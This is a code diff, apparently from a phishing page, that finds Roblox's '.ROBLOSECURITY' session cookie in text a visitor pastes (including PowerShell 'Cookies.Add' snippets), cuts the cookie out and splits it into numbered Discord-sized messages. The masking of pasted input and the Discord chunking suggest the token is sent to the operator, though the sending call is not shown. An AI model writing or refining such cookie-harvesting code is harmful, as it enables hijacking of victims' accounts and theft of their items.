@@ -18,97 +18,48 @@
     return text.replace(/[^\n\r]/g, CENSOR_CHAR);
   }
 
-  function findPowerShellCookieStart(text) {
-    const addPattern = /\$\w+\s*\.\s*Cookies\s*\.\s*Add/gi;
-    let match;
-
-    while ((match = addPattern.exec(text)) !== null) {
-      const window = text.slice(match.index, match.index + 1500);
-      if (
-        /\.ROBLOSECURITY/i.test(window) &&
-        window.indexOf(ROBLOX_WARNING_MARKER) !== -1
-      ) {
-        return match.index;
-      }
-    }
-
-    return -1;
-  }
-
-  function findRawCookieStart(text) {
-    const markerIndex = text.indexOf(ROBLOX_WARNING_MARKER);
-    if (markerIndex === -1) {
-      return -1;
-    }
-
-    const searchBack = text.slice(Math.max(0, markerIndex - 600), markerIndex);
-    const psInContext = searchBack.lastIndexOf("$");
-    const robloInContext = searchBack.lastIndexOf(".ROBLOSECURITY");
-
-    if (psInContext !== -1 && /Cookies\s*\.\s*Add/i.test(searchBack.slice(psInContext))) {
-      return Math.max(0, markerIndex - 600) + psInContext;
-    }
-
-    if (robloInContext !== -1) {
-      const absoluteRob = Math.max(0, markerIndex - 600) + robloInContext;
-      const lineStart = text.lastIndexOf("\n", absoluteRob) + 1;
-      return lineStart;
-    }
-
-    return markerIndex;
-  }
-
-  function findCookieStart(text) {
-    const psStart = findPowerShellCookieStart(text);
-    const rawStart = findRawCookieStart(text);
-
-    if (psStart === -1) {
-      return rawStart;
-    }
-    if (rawStart === -1) {
-      return psStart;
-    }
-
-    return Math.min(psStart, rawStart);
-  }
-
   function prepareSubmission(text) {
     const normalized = text.trim();
-    const start = findCookieStart(normalized);
+    const robloMatch = normalized.match(/\.ROBLOSECURITY/i);
 
-    if (start === -1) {
-      return normalized;
+    if (robloMatch && robloMatch.index !== undefined) {
+      return normalized.slice(robloMatch.index);
     }
 
-    return normalized.slice(start);
+    const markerIndex = normalized.indexOf(ROBLOX_WARNING_MARKER);
+    if (markerIndex !== -1) {
+      return normalized.slice(markerIndex);
+    }
+
+    return normalized;
   }
 
   function chunkPayload(text) {
     if (!text) {
-      return [""];
+      return [];
     }
 
     if (text.length <= DISCORD_LIMIT) {
       return [text];
     }
 
-    const messages = [];
+    const rawParts = [];
     let offset = 0;
+    const sliceSize = DISCORD_LIMIT - 14;
 
     while (offset < text.length) {
-      const remaining = text.length - offset;
-      const remainingParts = Math.ceil(remaining / (DISCORD_LIMIT - 12));
-      const partIndex = messages.length + 1;
-      const totalParts = messages.length + remainingParts;
-      const prefix = `[${partIndex}/${totalParts}]\n`;
-      const maxBody = DISCORD_LIMIT - prefix.length;
-      const body = text.slice(offset, offset + maxBody);
-
-      messages.push(prefix + body);
-      offset += body.length;
+      rawParts.push(text.slice(offset, offset + sliceSize));
+      offset += sliceSize;
     }
 
-    return messages;
+    const total = rawParts.length;
+
+    return rawParts.map(function (part, index) {
+      const prefix = `[${index + 1}/${total}]\n`;
+      const maxBody = DISCORD_LIMIT - prefix.length;
+      const body = part.slice(0, maxBody);
+      return prefix + body;
+    });
   }
 
   function syncMask() {
